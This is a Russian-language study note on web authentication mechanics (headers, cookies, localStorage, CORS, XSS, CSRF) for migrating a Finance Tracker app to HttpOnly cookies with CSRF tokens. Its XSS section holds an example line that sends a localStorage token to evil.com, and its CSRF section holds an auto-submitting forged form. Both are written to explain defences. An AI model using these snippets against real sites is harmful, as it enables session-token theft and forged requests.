# Конспект: как работает web-аутентификация под капотом

> Тема: HTTP, заголовки, cookie, localStorage, Origin, CORS, XSS, CSRF.
> Цель — понять **механику**, чтобы осознанно перейти с `localStorage` на `httpOnly` cookie + CSRF-защиту в Finance Tracker.

---

## 0. Главная идея всего конспекта

Аутентификация в вебе = **как браузер таскает твой "пропуск" (токен) между запросами**.
Весь вопрос безопасности сводится к двум вещам:

1. **Кто может ПРОЧИТАТЬ этот пропуск?** (угроза кражи → XSS)
2. **Кто может ЗАСТАВИТЬ браузер отправить пропуск?** (угроза подделки запроса → CSRF)

Держи эти два вопроса в голове всё время. Каждая технология ниже отвечает на один из них.

---

## 1. HTTP-запрос: из чего он состоит

Когда браузер общается с сервером, он шлёт **HTTP-запрос**. Это просто текст определённой структуры:

```
POST /api/expenses HTTP/1.1        <- строка запроса: метод + путь
Host: finance-tracker.com          <- \
Content-Type: application/json     <-  |  ЗАГОЛОВКИ (headers)
Authorization: Bearer eyJhbGc...   <- /   метаданные запроса
Cookie: token=eyJhbGc...           <- /
                                   <- пустая строка = конец заголовков
{ "amount": 100 }                  <- ТЕЛО (body): сами данные
```

Сервер отвечает **HTTP-ответом** такой же структуры:

```
HTTP/1.1 200 OK                    <- статус
Content-Type: application/json     <- \  заголовки ответа
Set-Cookie: token=eyJ...; HttpOnly <- /
                                   <- пустая строка
{ "id": 42 }                       <- тело ответа
```


jKbv2006jKbv
jKbv2006jKbv

> [!note] Запомни
> **Заголовки** — это метаданные (кто я, что несу, мой токен).
> **Тело** — это полезные данные (JSON расхода).
> Cookie и токены живут в **заголовках**, не в теле.

## 2. Заголовки (Headers): кто их ставит — вот главный вопрос

Заголовков много, но нам важен один принцип: **кто именно вписывает заголовок в запрос**.

### 2.1 Заголовок `Authorization` (твоя текущая схема)

```
Authorization: Bearer <твой JWT>
```

- Этот заголовок **браузер НЕ ставит сам, никогда**.
- Его обязан явно вписать **твой JavaScript** на фронте:

```js
// это код твоего фронта на finance-tracker.com
fetch("/api/expenses", {
  headers: { "Authorization": "Bearer " + token }  // <- ты вписал вручную
})
```

- Токен фронт достаёт из `localStorage` (см. раздел 4).

> [!important] Ключевой вывод №1
> Раз `Authorization` ставит только ТВОЙ JS, а токен лежит в ТВОЁМ localStorage —
> чужой сайт (`evil.com`) не может ни достать токен, ни поставить заголовок.
> **Поэтому header-схема иммунна к CSRF.** (запомни, вернёмся в разделе 8)

### 2.2 Заголовок `Cookie` (куда мы мигрируем)

```
Cookie: token=<твой JWT>
```

- Этот заголовок **браузер ставит САМ, автоматически**.
- Правило браузера: *"Я отправляю запрос на `finance-tracker.com`? Дай-ка проверю — есть ли у меня сохранённые cookie для этого домена. Есть → прикреплю их к запросу."*
- Браузеру **всё равно, кто инициировал запрос**. Важно только — **куда** летит запрос (на какой домен).

> [!important] Ключевой вывод №2
> Cookie прикрепляется браузером **автоматически по домену назначения**.
> Инициатор запроса роли не играет. Это удобно, но это же и открывает CSRF.

## 3. Cookie: что это физически

**Cookie** — маленький кусочек данных `имя=значение`, который:

1. Сервер отдаёт браузеру через заголовок `Set-Cookie` в **ответе**.
2. Браузер **сохраняет** его у себя (привязывает к домену).
3. Браузер **сам прикрепляет** его в заголовок `Cookie` при **каждом** следующем запросе на этот домен.

Наглядно, весь цикл:

```
1. Логин:
   Фронт  --POST /api/login {email,pass}-->  Сервер
   Фронт  <--200 OK  Set-Cookie: token=eyJ...; HttpOnly-- Сервер
   [браузер сохранил cookie у себя]

2. Любой следующий запрос:
   Фронт  --GET /api/expenses  Cookie: token=eyJ...-->  Сервер
          ^^^ браузер сам подставил cookie, фронт про неё даже не знает
```

### Флаги cookie (их ставит сервер в `Set-Cookie`)

Это самое важное для безопасности. Флаги — это "настройки" cookie:

| Флаг | Что делает | Зачем |
|---|---|---|
| `HttpOnly` | JS **не может прочитать** эту cookie через `document.cookie` | защита от кражи через XSS |
| `Secure` | cookie шлётся **только по HTTPS**, не по HTTP | защита от перехвата в сети |
| `SameSite` | контролирует, при каких кросс-сайтовых запросах cookie прикрепляется | защита от CSRF (раздел 9) |
| `Max-Age` / `Expires` | срок жизни cookie | авто-логаут |
| `Path` / `Domain` | на какие пути/домены cookie распространяется | ограничение области |

Пример того, что сервер пришлёт после логина:

```
Set-Cookie: token=eyJhbGc...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=86400
```

> [!tip] `HttpOnly` — это не про HTTP
> Название путает. `HttpOnly` значит "доступна только HTTP(S)-запросам, но НЕ JavaScript-у".
> То есть браузер прикрепит её к запросу, но `document.cookie` её не покажет.

## 4. localStorage: альтернатива cookie (твоя текущая схема)

`localStorage` — это **хранилище "ключ-значение" внутри браузера**, доступное из JS:

```js
localStorage.setItem("token", "eyJhbGc...")  // сохранить
const t = localStorage.getItem("token")        // прочитать
```

Отличия от cookie — принципиальные:

| | localStorage | cookie |
|---|---|---|
| Кто читает | **только JS** (`localStorage.getItem`) | браузер (авто) + JS если нет `HttpOnly` |
| Кто прикрепляет к запросу | **ты сам**, вручную вписывая header | **браузер сам**, автоматически |
| Виден чужому домену | нет (привязан к origin) | нет (привязан к домену), но шлётся авто |
| Доступен при XSS | **ДА** — любой JS читает | **НЕТ**, если стоит `HttpOnly` |

> [!warning] Вот в чём суть миграции
> Сейчас токен в `localStorage` → его **читает любой JS** → при XSS его украдут.
> Переносим в `HttpOnly` cookie → **JS не может его прочитать** → при XSS не украдут.
> НО: раз теперь браузер шлёт cookie сам → появляется CSRF. Это цена. (раздел 8)

## 5. Origin (источник): фундамент всей безопасности

**Origin** = комбинация из трёх частей:

```
        https :// finance-tracker.com : 443
        ^^^^^      ^^^^^^^^^^^^^^^^^^^^   ^^^
        схема          хост            порт
```

Два URL имеют **одинаковый origin**, только если совпадают **все три**: схема + хост + порт.

Примеры (важно для твоего проекта!):

| URL A | URL B | Тот же origin? | Почему |
|---|---|---|---|
| `localhost:3000` | `localhost:8081` | **НЕТ** | порт разный |
| `http://site.com` | `https://site.com` | НЕТ | схема разная |
| `site.com` | `api.site.com` | НЕТ | хост разный |
| `site.com/a` | `site.com/b` | ДА | путь не считается |

> [!important] Твой случай
> Фронт на `localhost:3000`, API на `localhost:8081` → это **РАЗНЫЕ origin**.
> Значит любой запрос фронта к API — это **cross-origin** запрос.
> Отсюда растут ноги CORS (раздел 7).

### Same-Origin Policy (SOP) — правило браузера по умолчанию

> Скрипт с одного origin **не может** читать данные другого origin.

Именно SOP запрещает JS с `evil.com` прочитать `localStorage` твоего `finance-tracker.com`. Это базовая защита браузера, работает всегда.

## 6. "Site" vs "Origin" — не путать (нужно для SameSite)

Есть два похожих, но РАЗНЫХ понятия:

- **Origin** = схема + хост + **порт** (строгое, см. раздел 5).
- **Site** = registrable-домен (eTLD+1), **порт и схема НЕ важны**.

```
localhost:3000  и  localhost:8081
   -> РАЗНЫЙ origin (порт отличается)
   -> ОДИН И ТОТ ЖЕ site (хост "localhost" совпадает)
```

Зачем это: атрибут `SameSite` у cookie смотрит на **site**, а не на origin.

> [!note] Практическое следствие для тебя
> Твои фронт и API — cross-**origin**, но same-**site** (оба `localhost`).
> Поэтому `SameSite=Lax` cookie **будет** работать между ними в разработке.
> В проде, если фронт и API на разных доменах — придётся думать про `SameSite=None`.

## 7. CORS: разрешение на cross-origin чтение

**CORS (Cross-Origin Resource Sharing)** — механизм, которым сервер говорит браузеру: *"вот этим чужим origin я разрешаю читать мои ответы"*.

Логика: SOP по умолчанию **запрещает** фронту читать ответ чужого origin. CORS — это способ сервера сделать **исключение**.

Работает через заголовки в **ответе** сервера:

```
Access-Control-Allow-Origin: http://localhost:3000   <- кому разрешаю читать
Access-Control-Allow-Methods: GET, POST, PATCH, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true               <- разрешаю слать cookie
```

### Как это выглядит сейчас у тебя (`middleware.go`)

```go
w.Header().Set("Access-Control-Allow-Origin", "*")  // "читать могут ВСЕ"
```

`*` = "разрешаю любому origin". Пока токен в header — это работает.

### Почему `*` СЛОМАЕТСЯ с cookie

Правило браузера, железное:

> Если фронт делает запрос с `credentials: 'include'` (= "прикрепи cookie"),
> то сервер в ответе **обязан** назвать **конкретный** origin.
> `Access-Control-Allow-Origin: *` при credentials — **ЗАПРЕЩЁН**.

Почему так строго? Смысл `*` = "доверяю всем". Скрести это с cookie = "любому сайту можно читать мои ответы **вместе с приватными cookie юзера**". Это была бы дыра размером с дом. Поэтому спека CORS заставляет тебя назвать конкретного доверенного (например `http://localhost:3000`) — осознанно, а не wildcard-ом.

Если оставить `*` + cookie, браузер **заблокирует** запрос с ошибкой:

```
The value of the 'Access-Control-Allow-Origin' header must not be
the wildcard '*' when the request's credentials mode is 'include'.
```

> [!warning] Задача на миграцию
> В `middleware.go` заменить `*` на конкретный origin фронта (брать из конфига)
> и добавить `Access-Control-Allow-Credentials: true`.
> Иначе логин через cookie физически не заработает.

### `credentials: 'include'` — сторона фронта

Чтобы браузер вообще прикреплял cookie к cross-origin запросу, фронт должен явно попросить:

```js
fetch("http://localhost:8081/api/expenses", {
  credentials: "include"   // "браузер, прикрепи мои cookie к этому cross-origin запросу"
})
```

Без этого флага браузер cookie к чужому origin **не приложит**.

## 8. XSS и CSRF: две угрозы, которые всё время путают

Это кульминация. Две РАЗНЫЕ атаки, и каждая технология выше защищает от одной из них.

### 8.1 XSS (Cross-Site Scripting) — "чужой скрипт на твоей странице"

Атакующий как-то внедряет свой `<script>` на ТВОЙ сайт (например, через поле ввода, которое ты не отфильтровал). Этот скрипт выполняется **как твой родной код**, с полным доступом к странице.

Что он украдёт:
```js
// злодейский скрипт, выполняется на твоём finance-tracker.com
fetch("https://evil.com/steal?token=" + localStorage.getItem("token"))
```

- Токен в `localStorage` → **украден** (JS его читает).
- Токен в `HttpOnly` cookie → **не украден** (JS не видит cookie).

> Защита от XSS-кражи токена = `HttpOnly` cookie. Вот зачем мы мигрируем.

### 8.2 CSRF (Cross-Site Request Forgery) — "чужой сайт дёргает твой API от твоего имени"

Атакующему НЕ нужно читать твой токен. Он пользуется тем, что **браузер сам прикрепит cookie**.

Сценарий:
1. Ты залогинен в Finance Tracker (в браузере лежит `HttpOnly` cookie с JWT).
2. Открываешь `evil.com` в другой вкладке.
3. На `evil.com` спрятан код, который **сам** отправляет запрос на твой API:

```html
<form action="https://finance-tracker.com/api/expenses" method="POST" id="f">
  <input name="amount" value="999999">
</form>
<script>document.getElementById('f').submit()</script>  <!-- сабмит без клика -->
```

4. Браузер видит: запрос летит на `finance-tracker.com` → **автоматически прикрепляет твою cookie с JWT**.
5. Сервер получает валидный токен, не может отличить подделку от настоящего запроса → создаёт расход 999999.

> Атакующий **не видел** токен (`HttpOnly` же!). Он использовал **авто-отправку cookie браузером**.

### 8.3 Таблица-итог (заучить)

| Угроза | Что делает атакующий | localStorage + header | HttpOnly cookie |
|---|---|---|---|
| **XSS** | читает твой токен через свой JS | ❌ уязвим (JS читает localStorage) | ✅ защищён (JS не видит cookie) |
| **CSRF** | заставляет браузер отправить запрос | ✅ защищён (header ставит только твой JS) | ❌ уязвим (браузер шлёт cookie сам) |

> [!important] Самый важный вывод конспекта
> Cookie и CSRF-защита — это **ОДИН ПАКЕТ**, неразделимый.
> Переходя на `HttpOnly` cookie, ты закрываешь XSS-кражу, но открываешь CSRF.
> Нельзя взять cookie без CSRF-защиты — иначе просто меняешь одну дыру на другую.

## 9. Защита от CSRF: `SameSite` + CSRF-токен

Две линии обороны, работают вместе (defense in depth).

### 9.1 Первая линия: `SameSite` (флаг cookie, бесплатно)

Говорит браузеру, при каких запросах прикреплять cookie:

| Значение | Когда прикрепляет cookie | Защита от CSRF | Минус |
|---|---|---|---|
| `Strict` | только если запрос инициирован с ТВОЕГО же site | максимальная | переход по ссылке извне → юзер разлогинен на первом заходе |
| `Lax` | при GET-навигации верхнего уровня (юзер кликнул ссылку). **НЕ** при cross-site POST/PATCH/DELETE и фоновых под-запросах | хорошая | GET-навигация всё же пропускается |
| `None` | всегда, даже cross-site (требует `Secure`) | никакой | нужно для реально кросс-доменных API |

Вернёмся к атаке из 8.2 (спрятанный cross-site `POST` с `evil.com`):
- Cookie с `SameSite=Lax` → браузер на **cross-site POST cookie НЕ прикрепит** → сервер получит запрос без токена → **401** → атака провалилась. **Бесплатно, силами браузера.**

### 9.2 Зачем тогда ещё CSRF-токен, если `Lax` уже защищает?

`Lax` не покрывает всё:
- Старые браузеры, не знающие `SameSite` → игнорируют флаг → защиты ноль.
- `Lax` **пропускает GET-навигацию** верхнего уровня. Если у тебя есть меняющий состояние GET-эндпоинт (плохая практика, но бывает) — он уязвим.
- Defense in depth: не полагаться на одну стенку.

### 9.3 Вторая линия: CSRF-токен (double-submit паттерн)

Идея: сервер требует, чтобы в **опасных** запросах (POST/PATCH/DELETE) фронт прислал секрет, который **чужой сайт не может узнать**.

Механика double-submit:
1. Сервер генерит случайный CSRF-токен и кладёт его в **обычную (НЕ HttpOnly) cookie** — чтобы JS фронта мог её прочитать.
2. Фронт читает этот токен из cookie и вписывает его в **кастомный заголовок**:
   ```js
   fetch("/api/expenses", {
     method: "POST",
     credentials: "include",
     headers: { "X-CSRF-Token": csrfTokenFromCookie }
   })
   ```
3. Сервер сравнивает: значение в cookie `==` значение в заголовке? Совпало → запрос настоящий.

Почему это ломает атаку `evil.com`:
- Чтобы поставить заголовок `X-CSRF-Token`, `evil.com` должен **прочитать** CSRF-cookie.
- Но SOP (раздел 5) запрещает `evil.com` читать cookie/данные твоего домена.
- Плюс: cross-site `<form>` **вообще не умеет** ставить кастомные заголовки.
- → `evil.com` не может подставить правильный CSRF-токен → сервер отвергает запрос.

> [!note] Почему JWT-cookie `HttpOnly`, а CSRF-cookie — нет
> JWT прячем от JS (`HttpOnly`), чтобы не украли при XSS.
> CSRF-токен, наоборот, фронт **должен** читать из JS, чтобы вписать в заголовок → он НЕ `HttpOnly`.
> Это ок: сам по себе CSRF-токен бесполезен без валидной auth-cookie.

## 10. Итоговая картина миграции Finance Tracker

Что физически поменяется (пока просто карта, код — отдельно):

**Бэкенд (Go):**
1. `Login`/`Register`: перестать слать JWT в теле, начать ставить его через `Set-Cookie` с флагами `HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age`.
2. `AuthMiddleware`: читать токен **из cookie** (`r.Cookie(...)`), а не из `Authorization` header.
3. CORS в `middleware.go`: `*` → конкретный origin + `Access-Control-Allow-Credentials: true`.
4. Добавить CSRF: генерить токен, класть в не-HttpOnly cookie, проверять заголовок `X-CSRF-Token` на POST/PATCH/DELETE.
5. Нужен эндпоинт `Logout` (очистить cookie), т.к. фронт больше не может сам удалить `HttpOnly` cookie.

**Фронтенд (React):**
1. Убрать `localStorage` для токена.
2. Во все запросы добавить `credentials: "include"`.
3. Читать CSRF-токен из cookie и слать в `X-CSRF-Token`.

## 11. Шпаргалка "кто что делает" (для быстрого повторения)

| Вопрос | Ответ |
|---|---|
| Кто ставит `Authorization` header? | Только твой JS, вручную |
| Кто прикрепляет `Cookie` header? | Браузер, автоматически, по домену |
| Что читает `localStorage`? | Только JS |
| Что читает `HttpOnly` cookie? | Никакой JS — только браузер прикрепляет к запросу |
| От чего защищает `HttpOnly`? | От кражи токена при XSS |
| От чего защищает `SameSite`? | От CSRF (авто-отправки cookie на cross-site запрос) |
| Почему `Allow-Origin: *` ломается с cookie? | Браузер запрещает wildcard + credentials |
| Почему header-схема иммунна к CSRF? | `Authorization` ставит только твой JS, чужой сайт не может |
| Почему cookie уязвима к CSRF? | Браузер шлёт её сам, не спрашивая инициатора |
| Зачем CSRF-токен, если есть `SameSite`? | Defense in depth + старые браузеры + GET-навигация |
